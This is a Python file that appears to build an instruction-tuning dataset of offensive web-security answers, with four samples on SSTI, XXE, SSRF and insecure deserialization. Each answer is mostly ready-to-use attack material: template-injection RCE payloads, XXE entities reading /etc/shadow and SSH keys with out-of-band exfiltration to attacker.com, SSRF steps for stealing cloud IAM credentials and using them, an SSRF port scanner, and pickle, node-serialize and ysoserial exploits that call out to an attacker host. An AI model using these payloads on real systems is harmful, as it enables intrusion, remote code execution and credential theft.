#!/usr/bin/env python3
"""
Advanced injection attack dataset:
SSTI, XXE, SSRF (including cloud IMDS), Deserialization attacks.
"""

from generate_dataset import Sample

ADVANCED_INJECTION_SAMPLES = [
    # ── SSTI ────────────────────────────────────────────────
    Sample(
        instruction="How do you identify and exploit Server-Side Template Injection (SSTI) for RCE?",
        input="Target: Python Flask application, user input reflected in email template",
        output="""## Server-Side Template Injection (SSTI)

SSTI occurs when user input is embedded directly into a server-side template and evaluated.

### Detection — Universal Polyglot

Send this string and observe the response:
```
${{<%['"}}%\\
```

If the application errors (template syntax error) or evaluates part of it → SSTI candidate.

### Engine-Specific Identification

| Payload | Expected Result | Engine |
|---------|----------------|--------|
| `{{7*7}}` | `49` | Jinja2, Twig |
| `${7*7}` | `49` | FreeMarker, Thymeleaf, Groovy |
| `<%= 7*7 %>` | `49` | ERB (Ruby), ASP |
| `#{7*7}` | `49` | Ruby (Slim) |
| `{{7*'7'}}` | `7777777` | Jinja2 |
| `{{7*'7'}}` | `49` | Twig |
| `*{7*7}` | `49` | Thymeleaf |

### Jinja2 (Python) → RCE

**Path to code execution via Python class hierarchy:**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Find the index of `subprocess.Popen` or `os._wrap_close`:
```
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
```

**Compact RCE payload:**
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('whoami').read() }}
```

**Namespace-based (more reliable):**
```python
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {% for b in c.__init__.__globals__.values() %}
      {% if b.__class__ == {}.__class__ %}
        {% if 'eval' in b.keys() %}
          {{ b['eval']('__import__("os").popen("id").read()') }}
        {% endif %}
      {% endif %}
    {% endfor %}
  {% endif %}
{% endfor %}
```

**Filter bypass (when keywords are blocked):**
```python
# Using request.args to smuggle blocked keywords
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}

# String concatenation
{{ ''['__cl'+'ass__']['__mr'+'o__'][1] }}
```

### Twig (PHP) → RCE

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Via setHandler:
{{_self.env.setCache("ftp://attacker.com")|filter("cat /etc/passwd")}}
```

### FreeMarker (Java) → RCE

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Or via classloader:
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java) → RCE

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
```

### Smarty (PHP) → RCE

```php
{system('id')}
{php}echo `id`;{/php}
```

### Detection via Burp

```
1. Send: {{7*7}} in all input fields
2. Send: ${7*7} in all input fields
3. Check responses for '49'
4. Use Burp Intruder with SSTI payload list
```

### Automated Tools

```bash
# tplmap
python3 tplmap.py -u "https://target.com/page?name=*" --os-shell
python3 tplmap.py -u "https://target.com/" -d "name=*" --rce "id"

# SSTImap
python3 sstimap.py -u "https://target.com/page?input=*"
```
""",
        category="injection",
        subcategory="ssti",
    ),
    # ── XXE ─────────────────────────────────────────────────
    Sample(
        instruction="Demonstrate XML External Entity (XXE) injection including OOB exfiltration for blind scenarios.",
        input="Target: Java Spring application parsing XML in POST /api/import endpoint",
        output="""## XXE (XML External Entity) Injection

XXE exploits insecure XML parsers to read local files, perform SSRF, or exfiltrate data OOB.

### Basic In-Band File Read

```xml
POST /api/import
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

Response contains `/etc/passwd` content if parser is vulnerable.

### High-Value Files to Read

```xml
<!-- Linux -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///home/appuser/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///var/www/html/WEB-INF/web.xml">
<!ENTITY xxe SYSTEM "file:///opt/app/application.properties">

<!-- Windows -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">
```

### PHP Wrapper XXE (For binary/multiline files)

```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/shadow">
```
→ Returns base64-encoded content, avoiding issues with special characters.

### SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```
Probes AWS IMDSv1 for metadata, credentials.

### Blind XXE — OOB via DTD

When no direct output, use an external DTD:

**Step 1: Host malicious.dtd on attacker server**
```xml
<!-- https://attacker.com/malicious.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Send payload referencing external DTD**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/malicious.dtd">
  %xxe;
]>
<root><data>trigger</data></root>
```

The parser fetches `malicious.dtd`, which then exfiltrates `/etc/passwd` to attacker.

### Blind XXE — Error-Based (No Outbound Network)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```
→ Error message contains file contents (if parser includes it in error output).

### XXE via Content-Type Juggling

If target expects JSON but parses XML when Content-Type is changed:
```http
POST /api/data HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

### XXE via File Upload (Office Documents)

DOCX, XLSX, SVG files contain XML — upload them to trigger XXE:
```bash
# Create malicious SVG
cat > malicious.svg << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF

curl -F "file=@malicious.svg" https://target.com/upload
```

### Java-Specific: XXE via SAML

SAML assertions are XML — manipulate for XXE in SSO flows:
```xml
<samlp:Response xmlns:samlp="...">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <saml:Assertion>
    <saml:Subject>&xxe;</saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### Automated Testing

```bash
# XXEInjector
ruby XXEinjector.rb --host=attacker.com --file=/tmp/request.txt --path=/etc/passwd

# Burp Scanner (Pro) — automatic XXE detection

# Manual with interactsh
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_INTERACTSH_URL/">]><foo>&xxe;</foo>'
```
""",
        category="injection",
        subcategory="xxe",
    ),
    # ── SSRF ────────────────────────────────────────────────
    Sample(
        instruction="How do you exploit SSRF to access cloud metadata services and pivot to internal networks?",
        input="Target: AWS-hosted web application with URL fetching feature",
        output="""## SSRF — Cloud IMDS and Internal Network Pivoting

SSRF allows the attacker to make the server send HTTP requests to arbitrary destinations.

### Basic Detection

```
# URL fetch feature test
https://target.com/fetch?url=https://your-collaborator.oastify.com

# Confirm SSRF
https://target.com/fetch?url=http://169.254.169.254/

# Or use common internal hosts
http://localhost/
http://127.0.0.1/
http://[::1]/
http://0.0.0.0/
```

### AWS IMDSv1 Exploitation (No token required)

```bash
# Step 1: Confirm IMDS access
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/

# Step 2: Get IAM role name
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3: Get credentials (replace ROLE_NAME)
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Response:
{
    "AccessKeyId": "ASIA...",
    "SecretAccessKey": "...",
    "Token": "...",
    "Expiration": "2024-..."
}
```

**Use credentials with AWS CLI:**
```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
aws s3 ls
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path "/" --with-decryption
```

### AWS IMDSv2 Bypass (Token required but SSRF can get it)

```bash
# IMDSv2 needs a PUT request first to get a token
# Many SSRF endpoints only support GET — but if they support headers:

# Step 1: Get token (needs PUT + X-aws-ec2-metadata-token-ttl-seconds header)
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# If SSRF allows custom headers (e.g., via Gopher protocol):
https://target.com/fetch?url=gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:21600%0d%0a%0d%0a

# Step 2: Use token
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ \
    [with header X-aws-ec2-metadata-token: TOKEN]
```

### GCP Metadata Service

```bash
# GCP requires custom header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/

# If SSRF allows custom headers:
https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&header=Metadata-Flavor:Google

# Service account token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# SSH keys
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
```

### Azure IMDS

```bash
# Azure IMDS (no custom header needed in some versions)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Managed Identity token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Internal Network Scanning via SSRF

```python
# Port scan via SSRF (detect open/closed by response time or error)
import requests
import concurrent.futures

def probe(port):
    try:
        r = requests.get(
            f"https://target.com/fetch",
            params={"url": f"http://192.168.1.1:{port}"},
            timeout=5
        )
        if "Connection refused" not in r.text:
            return port, "OPEN"
        return port, "CLOSED"
    except:
        return port, "ERROR"

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
    results = ex.map(probe, range(1, 10000))

for port, status in results:
    if status == "OPEN":
        print(f"Port {port}: OPEN")
```

### SSRF Filter Bypass Techniques

| Filter | Bypass |
|--------|--------|
| Block `169.254.169.254` | `169.254.169.254` via DNS (SSRF-DNS rebinding) |
| Block IP literals | `http://2852039166/` (decimal IP) |
| Block `localhost` | `http://0/`, `http://[::1]/`, `http://0.0.0.0/` |
| Require HTTPS | Use HTTP redirect: `https://evil.com` → 302 → `http://169.254.169.254/` |
| Block `169.x.x.x` | `http://metadata.aws/` (DNS to 169.254.169.254) |
| Filter path | `http://169.254.169.254/latest/meta-data/./iam/security-credentials/` |

### Protocol Smuggling via Gopher (SSRF → Internal Services)

```bash
# Gopher to Redis (SET arbitrary key)
https://target.com/fetch?url=gopher://127.0.0.1:6379/_%2A3%0d%0a%243%0d%0aSET%0d%0a%243%0d%0afoo%0d%0a%243%0d%0abar%0d%0a

# Gopher to internal HTTP (POST request to internal API)
# URL-encode the raw HTTP request
```
""",
        category="injection",
        subcategory="ssrf",
    ),
    # ── Deserialization ──────────────────────────────────────
    Sample(
        instruction="Explain insecure deserialization attacks in Java and how to achieve RCE via gadget chains.",
        input="Target: Java application using Apache Commons Collections 3.x, serialized objects in cookie",
        output="""## Java Deserialization → RCE

Insecure deserialization occurs when untrusted data is deserialized, and the classpath
contains "gadget" classes whose methods, when invoked during deserialization, execute
attacker-controlled code.

### How Java Deserialization Works

```
Attacker-controlled bytes → ObjectInputStream.readObject() →
  Gadget chain triggered → OS command executed
```

Serialized Java objects start with magic bytes: `AC ED 00 05` (hex) or `rO0AB` (base64).

### Identifying Serialized Data in Applications

```bash
# Look for magic bytes in requests
echo -n "rO0AB" | base64 -d | xxd | head -1
# AC ED 00 05 → Java serialized object!

# Common locations:
# - Cookie: JSESSIONID, rememberMe (Apache Shiro)
# - HTTP headers: X-Auth-Token
# - POST body (ViewState in Java EE)
# - WebSocket messages
```

### Generating Exploits with ysoserial

```bash
git clone https://github.com/frohoff/ysoserial
java -jar ysoserial.jar CommonsCollections6 'id' > payload.ser

# Encode for HTTP
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 > payload.b64

# Available gadget chains (check which libraries are on classpath):
# CommonsCollections1-7  (Apache Commons Collections)
# Spring1, Spring2       (Spring Framework)
# Hibernate1, Hibernate2 (Hibernate ORM)
# Groovy1                (Apache Groovy)
# JRMPClient             (JRMP client for remote gadget)
# URLDNS                 (Safe probe - makes DNS lookup)
```

### Probe Without Impact: URLDNS Gadget

```bash
# Safe test — only makes DNS lookup, no command execution
java -jar ysoserial.jar URLDNS "http://$(whoami).your-collaborator.oastify.com" > probe.ser

# Send via cookie:
curl https://target.com/ \
  --cookie "session=$(cat probe.ser | base64 -w0)"

# If your Collaborator receives a DNS request → deserialize vulnerability confirmed
```

### Apache Shiro RememberMe Cookie

Shiro encrypts the rememberMe cookie with AES. If the default/known key is used:
```bash
# Check for default key (AES CBC with key: kPH+bIxk5D2deZiIxcaaaA==)
# Generate exploit:
java -jar ysoserial.jar CommonsCollections4 'curl http://attacker.com/$(id)' | \
  python3 shiro_encrypt.py --key "kPH+bIxk5D2deZiIxcaaaA==" > shiro_payload.b64

# Send:
curl https://target.com/ \
  -H "Cookie: rememberMe=$(cat shiro_payload.b64)"

# Tool: shiro_attack
python3 shiro_attack.py -u https://target.com/ --key kPH+bIxk5D2deZiIxcaaaA==
```

### Python Deserialization (pickle)

```python
# Vulnerable code:
import pickle, base64

data = base64.b64decode(request.cookies.get('session'))
obj = pickle.loads(data)  # DANGEROUS

# Exploit:
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(id)',))

import base64
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
# Send as session cookie
```

### PHP Deserialization (unserialize)

```php
// Vulnerable code:
$data = unserialize(base64_decode($_COOKIE['session']));

// Gadget chain exploit (e.g., Laravel < 8.x):
// Use PHPGGC to generate:
phpggc Laravel/RCE1 system id | base64
// Or:
phpggc Symfony/RCE4 exec 'id' | base64
```

### Node.js (node-serialize)

```javascript
// Vulnerable:
const obj = serialize.unserialize(req.body.data);

// Exploit via IIFE in serialized function:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,r){require('http').get('http://attacker.com/?d='+r)})}()"}
```

### Detection

```bash
# Network traffic analysis: look for AC ED 00 05
tcpdump -A -i eth0 | grep -a "..AC..ED..00..05"

# Java agent: SerialKiller (allowlist-based protection bypass detector)

# Static: find ObjectInputStream.readObject() without validation
grep -rn "readObject()" --include="*.java"

# Fuzzing: send random base64-encoded payloads
for chain in CommonsCollections1 CommonsCollections6 Spring1 Hibernate1; do
    java -jar ysoserial.jar $chain 'sleep 5' | \
    curl -s -m 10 --data-binary @- https://target.com/api/endpoint
done
```
""",
        category="injection",
        subcategory="deserialization",
    ),
]
